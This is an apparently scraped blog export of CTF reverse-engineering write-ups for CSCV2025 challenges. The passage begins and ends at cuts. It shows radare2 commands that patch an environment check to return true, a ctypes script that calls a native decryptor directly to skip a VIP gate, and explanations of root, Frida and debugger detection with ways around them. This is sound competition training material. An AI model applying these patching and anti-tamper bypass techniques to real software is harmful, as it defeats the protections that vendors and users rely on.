sym.imp.malloc () // void *malloc(0x00000000) r14 = rax v = rax \u0026amp; rax if (!v) goto loc_0x00001820 loc_0x00001798: // orphan r15 = r15d rsi = rbp // const void *s2 // rsp rdi = rax // void *s1 rdx = r15 // size_t n sym.imp.memcpy () // void *memcpy(0, 0x0000000000000000, 0) byte [r14 + r15] = 0 rdi = rbx sym.imp.EVP_CIPHER_CTX_free () rdi = rbp // void *ptr // rsp sym.imp.free () // void free(0x0000000000000000) rdi = r13 // void *ptr sym.imp.free () // void free(0) rdi = r12 // void *ptr sym.imp.free () // void free(0) goto loc_0x000017e3 loc_0x000017e3: // orphan // CODE XREF from sym.decrypt_flag_file @ 0x17ce(x) rsp += 0x28 rax = r14 rbx = pop () rbp = pop () r12 = pop () r13 = pop () r14 = pop () r15 = pop () return return rax; loc_0x000017f8: // orphan // CODE XREF from sym.decrypt_flag_file @ 0x16fd(x) sym.imp.EVP_aes_128_cbc () rsi = rax goto loc_0x0000170b loc_0x00001808: // orphan // CODE XREFS from sym.decrypt_flag_file @ 0x169e(x), 0x16b2(x) rdi = rbx // FILE *stream sym.imp.fclose () // int fclose(0) rdi = r12 // void *ptr sym.imp.free () // void free(0) goto loc_0x000017e0 loc_0x00001820: // orphan // CODE XREFS from sym.decrypt_flag_file @ 0x1755(x), 0x1771(x), 0x1792(x) rdi = rbx sym.imp.EVP_CIPHER_CTX_free () rdi = r13 // void *ptr sym.imp.free () // void free(0) rdi = r12 // void *ptr sym.imp.free () // void free(0) rdi = rbp // void *ptr // rsp sym.imp.free () // void free(0x0000000000000000) goto loc_0x000017e0 loc_0x00001848: // orphan // CODE XREF from sym.decrypt_flag_file @ 0x171f(x) rdi = rbx sym.imp.EVP_CIPHER_CTX_free () loc_0x00001850: // orphan // CODE XREF from sym.decrypt_flag_file @ 0x16f1(x) rdi = r13 // void *ptr sym.imp.free () // void free(0) rdi = r12 // void *ptr sym.imp.free () // void free(0) goto loc_0x000017e0 } We have dump all the flow of decrypt_flag_file,let patch env_checks_ok directly to return 1:\ncp libnative.so libnative.so.bak(backup) r2 -w -e bin.relocs.apply=true -q -c \u0026#39;s 0x000015a0; wx b801000000c3\u0026#39; libnative.so(patch) r2 -e bin.relocs.apply=true -qc \u0026#39;pd 3 @ 0x000015a0\u0026#39; libnative.so(verify) The output is:\n;-- env_checks_ok: 0x000012e0 b801000000 mov eax, 1 0x000012e5 c3 ret 0x000012e6 0d0000488d or eax, 0x8d480000 Let use this python code i take from chatGPT to bypass the chatbot entirely and call the native decryptor directly.\n# bypass_vip_and_dump_flag_diag.py import os, sys, ctypes from ctypes import c_char_p, c_void_p, c_int def get_resource_path(name): base = getattr(sys, \u0026#34;_MEIPASS\u0026#34;, os.path.dirname(__file__)) return os.path.join(base, name) LIBNAME = \u0026#34;libnative.dll\u0026#34; if sys.platform == \u0026#34;win32\u0026#34; else \u0026#34;libnative.so\u0026#34; lib_path = os.path.abspath(get_resource_path(LIBNAME)) flag_path = os.path.abspath(get_resource_path(\u0026#34;flag.enc\u0026#34;)) exe_path = os.path.abspath(sys.executable) print(\u0026#34;[i] lib path :\u0026#34;, lib_path) print(\u0026#34;[i] flag path:\u0026#34;, flag_path) print(\u0026#34;[i] exe path :\u0026#34;, exe_path) if not os.path.exists(lib_path): raise SystemExit(\u0026#34;[!] Library not found\u0026#34;) if not os.path.exists(flag_path): raise SystemExit(\u0026#34;[!] flag.enc not found here\u0026#34;) lib = ctypes.CDLL(lib_path) # prototypes (match the app) try: check_integrity = lib.check_integrity check_integrity.argtypes = [c_char_p] check_integrity.restype = c_int except AttributeError: check_integrity = None decrypt_flag_file = lib.decrypt_flag_file decrypt_flag_file.argtypes = [c_char_p] decrypt_flag_file.restype = c_void_p free_mem = lib.free_mem free_mem.argtypes = [c_void_p] free_mem.restype = None # 1) Some builds require this call first. if check_integrity is not None: try: ok = check_integrity(exe_path.encode()) print(f\u0026#34;[i] check_integrity({exe_path}) -\u0026gt; {ok}\u0026#34;) # If it *must* pass, ok should be nonzero. If it returns 0, the lib may refuse to decrypt. except Exception as e: print(\u0026#34;[!] check_integrity raised:\u0026#34;, e) # 2) Use ABSOLUTE path to flag.enc ptr = decrypt_flag_file(flag_path.encode()) if not ptr: raise SystemExit(\u0026#34;[!] decrypt_flag_file returned NULL (lib refused / error)\u0026#34;) try: flag_bytes = ctypes.string_at(ptr) try: flag = flag_bytes.decode() except UnicodeDecodeError: flag = flag_bytes.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;replace\u0026#34;) print(\u0026#34;=== VIP VERIFIED ===\u0026#34;) print(flag) finally: free_mem(ptr) The output when we run this python code should be:\nâ””â”€$ python3 bypass_vip_and_dump_flag_diag.py [i] lib path : /home/son/main_extracted/libnative.so [i] flag path: /home/son/main_extracted/flag.enc [i] exe path : /usr/bin/python3 [i] check_integrity(/usr/bin/python3) -\u0026gt; 1 === VIP VERIFIED === CSCV2025{reversed_vip*_chatbot_bypassed} So the flag is CSCV2025{reversed_vip*_chatbot_bypassed}. Thank for reading this post!ğŸ’–ğŸ’–ğŸ’–\n","externalUrl":null,"permalink":"/re/1761232948830-chatbot/","section":"Res","summary":"","title":"Write-up for Chatbot CSCV2025","type":"re"},{"content":"Hello everyoneğŸ«¡! Today I will write a little bit about The Reverse Master challenge in CSCV2025. The question: When we install the file we will have an apk file like this: Use jadx-gui to decompile this file,then open Source code/com/ctf.challenge and you will see Main Activity like this: Open that and you will see the code below:\npackage com.ctf.challenge; import android.graphics.Color; import android.os.Bundle; import android.util.Log; import android.view.View; import android.view.ViewGroup; import android.widget.Button; import android.widget.LinearLayout; import android.widget.TextView; import androidx.appcompat.app.AppCompatActivity; import com.google.android.material.textfield.TextInputEditText; import com.google.android.material.textfield.TextInputLayout; import java.io.BufferedReader; import java.io.File; import java.io.IOException; import java.io.InputStreamReader; import java.net.InetSocketAddress; import java.net.Socket; import o.CountDownTimerC0176z3; import o.F2; import o.F3; import o.RunnableC0154w; import o.V4; /* loaded from: classes.dex */ public final class MainActivity extends AppCompatActivity { public static final /* synthetic */ int b = 0; public final byte[] a = {66, 51, 122, 33, 86}; static { try { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } catch (UnsatisfiedLinkError e) { Log.e(\u0026#34;CTF\u0026#34;, \u0026#34;âŒ Native lib failed: \u0026#34; + e.getMessage()); } } public final native boolean checkSecondHalf(String str); public final native String getHint(); public final void h(LinearLayout linearLayout, String str, String str2) { View viewInflate = getLayoutInflater().inflate(android.R.layout.simple_list_item_2, (ViewGroup) linearLayout, false); TextView textView = (TextView) viewInflate.findViewById(android.R.id.text1); TextView textView2 = (TextView) viewInflate.findViewById(android.R.id.text2); textView.setText(\u0026#34;âš ï¸ \u0026#34;.concat(str)); textView.setTextColor(Color.parseColor(\u0026#34;#FF5252\u0026#34;)); textView.setTextSize(16.0f); textView.setTypeface(null, 1); textView2.setText(str2); textView2.setTextColor(Color.parseColor(\u0026#34;#BDBDBD\u0026#34;)); textView2.setTextSize(13.0f); linearLayout.addView(viewInflate); } @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public final void onCreate(Bundle bundle) throws IOException { boolean z; String line; super.onCreate(bundle); setContentView(R.layout.activity_main); boolean z2 = false; boolean z3 = (getApplicationInfo().flags \u0026amp; 2) != 0; String[] strArr = {\u0026#34;/system/app/Superuser.apk\u0026#34;, \u0026#34;/sbin/su\u0026#34;, \u0026#34;/system/bin/su\u0026#34;, \u0026#34;/system/xbin/su\u0026#34;, \u0026#34;/data/local/xbin/su\u0026#34;, \u0026#34;/data/local/bin/su\u0026#34;, \u0026#34;/system/sd/xbin/su\u0026#34;, \u0026#34;/system/bin/failsafe/su\u0026#34;, \u0026#34;/data/local/su\u0026#34;}; int i = 0; while (true) { if (i \u0026gt;= 9) { try { Runtime.getRuntime().exec(\u0026#34;su\u0026#34;); break; } catch (Exception unused) { z = false; } } else if (new File(strArr[i]).exists()) { break; } else { i++; } } z = true; try { BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\u0026#34;ps\u0026#34;).getInputStream())); do { line = bufferedReader.readLine(); if (line == null) { break; } else if (!V4.u(line, \u0026#34;frida\u0026#34;) \u0026amp;\u0026amp; !V4.u(line, \u0026#34;gum-js-loop\u0026#34;)) { } } while (!V4.u(line, \u0026#34;gmain\u0026#34;)); z2 = true; bufferedReader.close(); } catch (Exception unused2) { } int i2 = 27042; while (true) { if (i2 \u0026gt;= 27053) { break; } try { Socket socket = new Socket(); socket.connect(new InetSocketAddress(\u0026#34;127.0.0.1\u0026#34;, i2), 100); socket.close(); z2 = true; break; } catch (Exception unused3) { i2++; } } if (!z3 \u0026amp;\u0026amp; !z \u0026amp;\u0026amp; !z2) { Thread thread = new Thread(new RunnableC0154w(8, this)); thread.setDaemon(true); thread.start(); final TextInputLayout textInputLayout = (TextInputLayout) findViewById(R.id.flagInputLayout); final TextInputEditText textInputEditText = (TextInputEditText) findViewById(R.id.flagInput); Button button = (Button) findViewById(R.id.checkButton); Button button2 = (Button) findViewById(R.id.hintButton); button.setOnClickListener(new View.OnClickListener() { // from class: o.y3 /* JADX WARN: Removed duplicated region for block: B:4:0x001a */ @Override // android.view.View.OnClickListener /* Code decompiled incorrectly, please refer to instructions dump. To view partially-correct code enable \u0026#39;Show inconsistent code\u0026#39; option in preferences */ public final void onClick(android.view.View r13) { /* r12 = this; r13 = 16 r0 = 1 int r1 = com.ctf.challenge.MainActivity.b com.google.android.material.textfield.TextInputEditText r1 = r1 android.text.Editable r1 = r1.getText() java.lang.String r1 = java.lang.String.valueOf(r1) com.ctf.challenge.MainActivity r2 = r2 java.lang.String r3 = \u0026#34;CSCV2025{\u0026#34; boolean r3 = r1.startsWith(r3) r4 = 0 if (r3 != 0) goto L1c L1a: r13 = r4 goto L6e L1c: java.lang.String r3 = \u0026#34;}\u0026#34; boolean r3 = r1.endsWith(r3) if (r3 != 0) goto L25 goto L1a L25: int r3 = r1.length() int r3 = r3 - r0 r5 = 9 java.lang.String r1 = r1.substring(r5, r3) java.lang.String r3 = \u0026#34;substring(...)\u0026#34; o.F2.e(r1, r3) java.lang.String r5 = r1.substring(r4, r13) o.F2.e(r5, r3) byte[] r6 = new byte[r13] r6 = {x0090: FILL_ARRAY_DATA , data: [122, 86, 27, 22, 53, 35, 80, 77, 24, 98, 122, 7, 72, 21, 98, 114} // fill-array byte[] r7 = new byte[r13] r8 = r4 L44: if (r8 \u0026gt;= r13) goto L55 r9 = r6[r8] byte[] r10 = r2.a int r11 = r10.length int r11 = r8 % r11 r10 = r10[r11] r9 = r9 ^ r10 byte r9 = (byte) r9 r7[r8] = r9 int r8 = r8 + r0 goto L44 L55: java.lang.String r6 = new java.lang.String java.nio.charset.Charset r8 = o.X.a r6.\u0026lt;init\u0026gt;(r7, r8) boolean r5 = r5.equals(r6) if (r5 != 0) goto L63 goto L1a L63: java.lang.String r13 = r1.substring(r13) o.F2.e(r13, r3) boolean r13 = r2.checkSecondHalf(r13) L6e: com.google.android.material.textfield.TextInputLayout r1 = r3 if (r13 == 0) goto L80 java.lang.String r13 = \u0026#34;ğŸ‰ Correct! Flag is valid!\u0026#34; android.widget.Toast r13 = android.widget.Toast.makeText(r2, r13, r0) r13.show() r13 = 0 r1.setError(r13) return L80: java.lang.String r13 = \u0026#34;âŒ Wrong flag! Try again!\u0026#34; android.widget.Toast r13 = android.widget.Toast.makeText(r2, r13, r4) r13.show() java.lang.String r13 = \u0026#34;Invalid flag\u0026#34; r1.setError(r13) return */ throw new UnsupportedOperationException(\u0026#34;Method not decompiled: o.ViewOnClickListenerC0170y3.onClick(android.view.View):void\u0026#34;); } }); button2.setOnClickListener(new F3(3, this)); return; } setContentView(R.layout.security_warning); TextView textView = (TextView) findViewById(R.id.countdownText); LinearLayout linearLayout = (LinearLayout) findViewById(R.id.issuesList); if (z3) { F2.c(linearLayout); h(linearLayout, \u0026#34;Debug Mode Detected\u0026#34;, \u0026#34;Application is running in debuggable mode\u0026#34;); } if (z) { F2.c(linearLayout); h(linearLayout, \u0026#34;Root Access Detected\u0026#34;, \u0026#34;Device has been rooted or jailbroken\u0026#34;); } if (z2) { F2.c(linearLayout); h(linearLayout, \u0026#34;Frida Framework Detected\u0026#34;, \u0026#34;Dynamic instrumentation tool is running\u0026#34;); } new CountDownTimerC0176z3(textView, this).start(); } public final native void startFridaMonitoring(); } You can find the first half of the flag with this XOR code from python:\nbyte[] encrypted = { 122, 86, 27, 22, 53, 35, 80, 77, 24, 98, 122, 7, 72, 21, 98, 114 }; byte[] key = {66, 51, 122, 33, 86}; for (int i = 0; i \u0026lt; 16; i++) { decrypted[i] = encrypted[i] ^ key[i % key.length]; } String expected = new String(decrypted, Charset.UTF_8); return input.equals(expected); The output is:\n8ea7cac794842440 To find out the second half of the flag, we\u0026rsquo;ll disassemble and analyze the native code to reverse the logic inside checkSecondHalf from libnative-lib.so Let use apktool command in terminal to extract libnative-lib.so from the apk file:\napktool d -f reverse-master.apk -o reverse-master_src A new folder named reverse-master_src will appear in the same path you use Terminal. Check that out and find libnative-lib.so in the lib folder Let open this file in ghidra and find the Java_com_ctf_challenge_MainActivity_checkSecondHalf function:\nbool Java_com_ctf_challenge_MainActivity_checkSecondHalf (long *param_1,undefined8 param_2,undefined8 param_3) { int iVar1; int iVar2; int iVar3; ulong uVar4; char *__s; size_t sVar5; uVar4 = FUN_00119ca0(); if ((uVar4 \u0026amp; 1) != 0) { __android_log_print(4,\u0026#34;Lib-Native\u0026#34;,\u0026#34;Debugger detected in native code!\u0026#34;); return false; } __s = (char *)(**(code **)(*param_1 + 0x548))(param_1,param_3,0); if (__s != (char *)0x0) { sVar5 = strlen(__s); iVar1 = rand(); iVar1 = iVar1 % 0x32 + 1; iVar2 = rand(); iVar2 = iVar2 % 0x32 + 1; if (iVar1 * iVar1 + iVar2 * iVar2 == (iVar2 + iVar1) * (iVar2 + iVar1) + iVar1 * iVar2 * -2 + 1) { FUN_0011ac60(__s); FUN_0011accc(); } iVar1 = rand(); iVar1 = iVar1 % 100; iVar2 = rand(); iVar2 = iVar2 % 100; if ((iVar2 + iVar1) * (iVar2 + iVar1) \u0026lt; iVar1 * iVar1 + iVar2 * iVar2) { iVar3 = 0; } else { iVar3 = FUN_0011ad68(__s,sVar5 \u0026amp; 0xffffffff); iVar1 = rand(); iVar1 = iVar1 % 0x32 + 1; iVar2 = rand(); iVar2 = iVar2 % 0x32 + 1; if (iVar1 * iVar1 + iVar2 * iVar2 == (iVar2 + iVar1) * (iVar2 + iVar1) + iVar1 * iVar2 * -2 + 1) { FUN_0011b5e8(__s); FUN_0011b658(); } } (**(code **)(*param_1 + 0x550))(param_1,param_3,__s); if (iVar3 != 0) { iVar1 = rand(); iVar1 = iVar1 % 100; iVar2 = rand(); iVar2 = iVar2 % 100; if (iVar1 * iVar1 + iVar2 * iVar2 \u0026lt;= (iVar2 + iVar1) * (iVar2 + iVar1)) { return true; } } iVar1 = rand(); iVar1 = iVar1 % 0x32 + 1; iVar2 = rand(); iVar2 = iVar2 % 0x32 + 1; return iVar1 * iVar1 + iVar2 * iVar2 == (iVar2 + iVar1) * (iVar2 + iVar1) + iVar1 * iVar2 * -2 + 1; } rand(); rand(); return false; } Let chatGPT analyze this: So let go to FUN_0011ad68 to see what inside this:\nundefined4 FUN_0011ad68(byte *param_1,int param_2) { byte bVar1; byte bVar2; byte bVar3; byte bVar4; byte bVar5; undefined1 auVar6 [16]; undefined8 uVar7; uint5 uVar8; int iVar9; int iVar10; byte *pbVar11; uint5 *puVar12; uint uVar13; byte bVar14; byte bVar15; byte bVar16; byte bVar17; byte bVar18; undefined4 local_90; pbVar11 = (byte *)calloc(0x10,1); uVar13 = 0x1a2b; bVar18 = 0; local_90 = 0; do { if (uVar13 \u0026lt; 0x7a8b) { if (uVar13 == 0x1a2b) { iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; uVar13 = 0xbecf; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0x3c4d; } } else if (uVar13 == 0x3c4d) { if (param_2 != 0x10) goto LAB_0011b004; iVar9 = rand(); iVar9 = iVar9 % 0x32 + 1; iVar10 = rand(); iVar10 = iVar10 % 0x32 + 1; uVar13 = 0xbecf; if (iVar9 * iVar9 + iVar10 * iVar10 != (iVar10 + iVar9) * (iVar10 + iVar9) + iVar9 * iVar10 * -2 + 1) { uVar13 = 0x5e6f; } } else { if (uVar13 != 0x5e6f) goto LAB_0011b538; puVar12 = (uint5 *)calloc(5,1); if (puVar12 == (uint5 *)0x0) { bVar14 = 0; bVar18 = 0; bVar16 = 0; bVar17 = 0; bVar15 = 0; } else { bVar14 = 99; bVar15 = 0x7d; bVar17 = 0xe2; bVar16 = 0x14; bVar18 = 0xb8; *(undefined4 *)puVar12 = 0xb814e27d; *(byte *)((long)puVar12 + 4) = 99; } bVar1 = *(byte *)((long)puVar12 + 1); bVar2 = (byte)*puVar12; bVar3 = *(byte *)((long)puVar12 + 2); bVar4 = *(byte *)((long)puVar12 + 3); bVar5 = *(byte *)((long)puVar12 + 4); uVar8 = *puVar12; pbVar11[1] = (bVar17 ^ 0x6c) - 10 ^ bVar1; *pbVar11 = (bVar15 ^ 0x2f) - 7 ^ bVar2; pbVar11[2] = ((bVar16 | 1) ^ 0x95) - 0xd ^ bVar3 ^ 2; pbVar11[0xd] = (bVar18 ^ 8) - 0x2e ^ bVar4 ^ 0xd; pbVar11[4] = (bVar14 ^ 0x74) - 0x13 ^ bVar5 ^ 4; pbVar11[0xf] = (bVar15 ^ 7) - 0x34 ^ bVar2 ^ 0xf; pbVar11[0x10] = 0; pbVar11[3] = ((bVar18 | 2) ^ 0x21) - 0x10 ^ bVar4; pbVar11[0xe] = (bVar14 ^ 0x5a) - 0x31 ^ bVar5 ^ 0xe; auVar6._5_3_ = 0; auVar6._0_5_ = uVar8; auVar6[8] = bVar2; auVar6[9] = bVar1; auVar6[10] = bVar3; auVar6[0xb] = bVar4; auVar6[0xc] = bVar5; auVar6._13_3_ = 0; uVar7 = a64_TBL(ZEXT816(0),auVar6,0x201000403020100); bVar18 = ((bVar18 | 7) ^ 0x4d) - 0x1f ^ 8 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x18); *(ulong *)(pbVar11 + 5) = CONCAT17(((bVar16 | 0xb) ^ 0x53) - 0x2b ^ 0xc ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x38), CONCAT16((bVar17 ^ 0xe2) - 0x28 ^ 0xb ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x30), CONCAT15((bVar15 ^ 0x17) - 0x25 ^ 10 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x28) , CONCAT14(((bVar14 | 8) ^ 0x45) - 0x22 ^ 9 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x20), CONCAT13(bVar18,CONCAT12((bVar16 ^ 0x28) - 0x1c ^ 7 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x10), CONCAT11(((bVar17 | 5) ^ 0x47) - 0x19 ^ 6 ^ (byte)((ulong) uVar7 \u0026gt;\u0026gt; 8), (bVar15 ^ 0x4c) - 0x16 ^ 5 ^ (byte)uVar7))))))); iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; uVar13 = 0xbecf; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0x7a8b; } } } else if (uVar13 \u0026lt; 0xbecf) { if (uVar13 == 0x7a8b) { if (((((((((((((((*pbVar11 == *param_1 \u0026amp;\u0026amp; pbVar11[1] == param_1[1]) \u0026amp;\u0026amp; pbVar11[2] == param_1[2]) \u0026amp;\u0026amp; pbVar11[3] == param_1[3]) \u0026amp;\u0026amp; pbVar11[4] == param_1[4]) \u0026amp;\u0026amp; pbVar11[5] == param_1[5]) \u0026amp;\u0026amp; pbVar11[6] == param_1[6]) \u0026amp;\u0026amp; pbVar11[7] == param_1[7]) \u0026amp;\u0026amp; bVar18 == param_1[8]) \u0026amp;\u0026amp; pbVar11[9] == param_1[9]) \u0026amp;\u0026amp; pbVar11[10] == param_1[10]) \u0026amp;\u0026amp; pbVar11[0xb] == param_1[0xb]) \u0026amp;\u0026amp; pbVar11[0xc] == param_1[0xc]) \u0026amp;\u0026amp; pbVar11[0xd] == param_1[0xd]) \u0026amp;\u0026amp; pbVar11[0xe] == param_1[0xe]) \u0026amp;\u0026amp; pbVar11[0xf] == param_1[0xf]) { iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0x9cad; goto LAB_0011b008; } } LAB_0011b004: uVar13 = 0xbecf; } else { if (uVar13 != 0x9cad) goto LAB_0011b538; local_90 = 1; LAB_0011b0f4: uVar13 = 0xd1e2; } } else { if (uVar13 == 0xbecf) { local_90 = 0; goto LAB_0011b0f4; } if (uVar13 == 0xd1e2) { return local_90; } LAB_0011b538: iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0xbecf; } } LAB_0011b008: rand(); } while( true ); } So i give this to chatGPT and i have a python code solve the second half like this:\n# solve_second_half.py def u8(x): return x \u0026amp; 0xFF def compute_second_half(): # puVar12 = 0xb8 14 e2 7d + 0x63 (little-endian 0xb814e27d then 0x63) b2 = 0x7d b1 = 0xe2 b3 = 0x14 b4 = 0xb8 b5 = 0x63 # duplicates in code b14 = 0x63 b15 = 0x7d b17 = 0xe2 b16 = 0x14 b18 = 0xb8 pb = [0]*16 pb[1] = u8(((b17 ^ 0x6C) - 10) ^ b1) pb[0] = u8(((b15 ^ 0x2F) - 7) ^ b2) pb[2] = u8((((b16 | 1) ^ 0x95) - 13) ^ b3 ^ 2) pb[13] = u8((((b18 ^ 8) - 46) ^ b4) ^ 13) pb[4] = u8((((b14 ^ 0x74) - 19) ^ b5) ^ 4) pb[15] = u8((((b15 ^ 7) - 52) ^ b2) ^ 15) pb[3] = u8((((b18 | 2) ^ 0x21) - 16) ^ b4) pb[14] = u8((((b14 ^ 0x5A) - 49) ^ b5) ^ 14) # Build auVar6 (first 5 bytes are [b2,b1,b3,b4,b5]) au = [0]*16 au[0],au[1],au[2],au[3],au[4] = b2,b1,b3,b4,b5 # a64_TBL(..., mask=0x0201000403020100) â†’ select bytes [0,1,2,3,4,0,1,2] sel = [au[i] for i in (0,1,2,3,4,0,1,2)] pick = lambda sh: sel[(sh//8)] # update b18 and fill pb[5..12] b18 = u8(((b18 | 7) ^ 0x4D) - 0x1F ^ 8 ^ pick(0x18)) X1 = u8((b15 ^ 0x4C) - 0x16 ^ 5 ^ pick(0x00)) X2 = u8(((b17 | 5) ^ 0x47) - 0x19 ^ 6 ^ pick(0x08)) X3 = u8((b16 ^ 0x28) - 0x1C ^ 7 ^ pick(0x10)) X4 = u8(((b14 | 8) ^ 0x45) - 0x22 ^ 9 ^ pick(0x20)) X5 = u8((b15 ^ 0x17) - 0x25 ^ 10 ^ pick(0x28)) X6 = u8((b17 ^ 0xE2) - 0x28 ^ 11 ^ pick(0x30)) X7 = u8(((b16 | 0xB) ^ 0x53) - 0x2B ^ 12 ^ pick(0x38)) pb[5],pb[6],pb[7],pb[8],pb[9],pb[10],pb[11],pb[12] = X1,X2,X3,b18,X4,X5,X6,X7 return bytes(pb) if __name__ == \u0026#34;__main__\u0026#34;: second = compute_second_half() print(second.hex()) # 6fe3ccc3cf2197e4 print(second.decode()) # 6fe3ccc3cf2197e4 The output is:\n6fe3ccc3cf2197e4 So the flag is CSCV2025{8ea7cac7948424406fe3ccc3cf2197e4} Thanks for watching this postğŸ˜˜!\n","externalUrl":null,"permalink":"/re/1761228753586-re/","section":"Res","summary":"","title":"Write-up for Reverse Master CSCV2025 ","type":"re"},{"content":"Hello guysğŸ¤—! today i will write about a REV challenge that met at the CSCV2025 that named:Reezs.\nFirst when you install the file and extract the folder you will have an .exe file like this: When you run that file, you will see an CMD that told you enter the flag: Since there were no clues at first, I typed some random input to see how the program executes. As expected, it shut down immediately.\nThen I opened IDA and loaded the file to read the main function and understand the execution flow. In IDA View-A, the main function looks like this:\nLet F5 to see that pseudocode:\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // r8 __m128i si128; // xmm0 const char *v6; // rcx _BYTE v8[32]; // [rsp+0h] [rbp-58h] BYREF char Str[16]; // [rsp+20h] [rbp-38h] BYREF __m128i v10; // [rsp+30h] [rbp-28h] __int64 v11; // [rsp+40h] [rbp-18h] __int64 v12; // [rsp+48h] [rbp-10h] v10 = 0i64; *(_OWORD *)Str = 0i64; v11 = 0i64; sub_1400010F0(\u0026#34;Enter flag: \u0026#34;, argv, envp); sub_140001170(\u0026#34;%32s\u0026#34;, Str); if ( strlen(Str) != 32 ) { puts(\u0026#34;No\u0026#34;); if ( ((unsigned __int64)v8 ^ v12) == _security_cookie ) return 0; LABEL_5: __debugbreak(); } si128 = _mm_load_si128((const __m128i *)\u0026amp;xmmword_14001E030); *(__m128i *)Str = _mm_xor_si128(_mm_load_si128((const __m128i *)Str), si128); v10 = _mm_xor_si128(si128, v10); if ( _mm_movemask_epi8( _mm_and_si128( _mm_cmpeq_epi8(*(__m128i *)Str, (__m128i)xmmword_140029000), _mm_cmpeq_epi8(v10, (__m128i)xmmword_140029010))) == 0xFFFF ) v6 = (const char *)\u0026amp;unk_140023E7C; else v6 = \u0026#34;No\u0026#34;; sub_1400010F0(v6, v3, v4); if ( ((unsigned __int64)v8 ^ v12) != _security_cookie ) goto LABEL_5; return 0; } What are the important parts of that code we should care about? Let me explain.\nsub_1400010F0(\u0026#34;Enter flag: \u0026#34;, argv, envp); sub_140001170(\u0026#34;%32s\u0026#34;, Str); This line ask us to type 32-byte strings input 32-byte strings(or we know the flag will have 32-byte strings not include the format flag)\nsi128 = _mm_load_si128((const __m128i *)\u0026amp;xmmword_14001E030); This line point that it takes 16-byte constant of the xmmord_14001E030 adress into si128\n*(__m128i *)Str = _mm_xor_si128(_mm_load_si128((const __m128i *)Str), si128); This line is load 16-byte of Str XOR with si128 and the result is the first stage 16-byte strings of the Str\nv10 = _mm_xor_si128(si128, v10); v10 at first is assigned to 0i64, which is full of 0. If we XOR with si128, we will receive si128\nif ( _mm_movemask_epi8( _mm_and_si128( _mm_cmpeq_epi8(*(__m128i *)Str, (__m128i)xmmword_140029000), _mm_cmpeq_epi8(v10, (__m128i)xmmword_140029010))) == 0xFFFF ) This comparision can be analyze to smaller like this:\n_mm_cmpeq_epi8(*(__m128i *)Str, (__m128i)xmmword_140029000), =\u0026gt;Return 16-byte, each byte = 0xFF if (__m128i )Str == (__m128i)xmmword_140029000, else = 0x00\n_mm_and_si128( =\u0026gt;Only keep if both comparisons are equal at the same position\n_mm_movemask_epi8( =\u0026gt;take top 16-bit of each byte,if the result is 0xFFFF it means the 16-bit verified(or all 16 bytes were equal in both comparisons).\nIf both of conditions are true, the program will print:\n(const char *)\u0026amp;unk_140023E7C That is yes:\n.rdata:0000000140023E7C unk_140023E7C db 59h ; Y ; DATA XREF: main:loc_1400010CAâ†‘o .rdata:0000000140023E7D db 65h ; e .rdata:0000000140023E7E db 73h ; s .rdata:0000000140023E7F db 0 And i find this when point to xmmword_140029010 and press X(jump to xref)\n{ BOOL result; // eax result = IsDebuggerPresent(); if ( !result ) { xmmword_140029010 = xmmword_14001E010; xmmword_140029000 = xmmword_14001E000; } return result; } =\u0026gt;If you run the binary in a debugger, those constants at 0x140029010 and 0x140029000 wonâ€™t be initialized=\u0026gt;an anti-debugger trick. And if you don\u0026rsquo;t run in a debugger, xmmword_140029010 will be xmmword_14001E010 and xmmword_140029000 will be xmmword_14001E000\nSo i will use what i explained below to extract the flag:\n.rdata:000000014001E000 xmmword_14001E000 xmmword 939FCF9C9B9998C99DC8C9989ECFCB9Ah .rdata:000000014001E010 xmmword_14001E010 xmmword 9F9D9D9DCB989A9B999A98CF9DCFCFCFh .rdata:000000014001E030 xmmword_14001E030 xmmword 0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh +The first stage we take first 16-bytes of xmmword_14001E000 change into hex, then XOR with xmmword_14001E030\nThe the first 16-byte of xmmword_14001E000 is:\nunsigned char ida_chars[] = { 0x9A, 0xCB, 0xCF, 0x9E, 0x98, 0xC9, 0xC8, 0x9D, 0xC9, 0x98, 0x99, 0x9B, 0x9C, 0xCF, 0x9F, 0x93 }; XOR with 0xaa(xmmword_14001E030) into hex:\n30 61 65 34 32 63 62 37 63 32 33 31 36 65 35 39 ASCII:\n0ae42cb7c2316e59 +The second stage we take first 16-bytes of xmmword_14001E010 change into hex, then XOR with xmmword_14001E030\nThe the first 16-byte of xmmword_14001E000 is:\nunsigned char ida_chars[] = { 0xCF, 0xCF, 0xCF, 0x9D, 0xCF, 0x98, 0x9A, 0x99, 0x9B, 0x9A, 0x98, 0xCB, 0x9D, 0x9D, 0x9D, 0x9F }; XOR with 0xaa(xmmword_14001E030) into hex:\n65 65 65 37 65 32 30 33 31 30 32 61 37 37 37 35 ASCII:\neee7e203102a7775 And the flag is CSCV2025{0ae42cb7c2316e59eee7e203102a7775}\nThat\u0026rsquo;s all of this challenge. Thanks for 